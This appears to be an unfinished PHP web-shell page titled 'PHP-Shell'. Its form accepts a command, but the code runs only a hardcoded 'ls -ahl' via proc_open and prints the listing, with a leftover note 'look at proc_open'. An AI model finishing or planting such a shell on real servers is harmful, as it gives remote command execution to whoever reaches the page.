<html>
<head>
        <style type="text/css">
                body, div {
                        margin: 0;
                        padding: 0;
                }
		#micro {
			position: absolute;
			bottom: 0;
			right: 0;
			text-decoration: none;
			color: LightGrey;
		}
        </style>
</head>
<body>

<?php
$output = "";
if (isset($_POST['shell_command'])) {
$descriptorspec = array(
	0 => array("pipe", "r"),
	1 => array("pipe", "w"),
	2 => array("file", "/tmp/error-output.txt", "a")
);

$process = proc_open('ls -ahl', $descriptorspec, $pipes);

if (is_resource($process)) {
	$output = stream_get_contents($pipes[1]);
	fclose($pipes[1]);

	$return_value = proc_close($process);
}
}
?>

<h1>PHP-Shell</h1>
<textarea id="shell_output">
	<?php
		echo $output;
	?>
</textarea>
<br/>

<form id="shell_form" method="POST">
	<input name="shell_command" type="text" />
	<input type="submit" value="RUN" />
</form>

<a id="micro" href="http://www.google.ch">&micro;</a>
look at proc_open
</body>
